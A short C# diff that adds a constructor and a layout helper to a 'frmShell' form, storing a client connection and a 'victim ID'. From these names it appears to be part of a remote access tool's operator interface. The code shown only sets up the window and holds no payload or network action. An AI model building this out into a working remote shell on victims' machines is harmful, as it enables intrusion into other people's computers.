@@ -12,14 +12,26 @@ namespace Eden
 {
     public partial class frmShell : Form
     {
-        public frmShell()
+        private Client m_clnt;
+        private string m_szVictimID;
+
+        public frmShell(Client clnt, string szVictimID)
         {
             InitializeComponent();
+
+            m_clnt = clnt;
+            m_szVictimID = szVictimID;
+        }
+
+        void fnSetup()
+        {
+            //Controls
+            StartPosition = FormStartPosition.CenterScreen;
         }
 
         private void frmShell_Load(object sender, EventArgs e)
         {
-
+            fnSetup();
         }
     }
 }
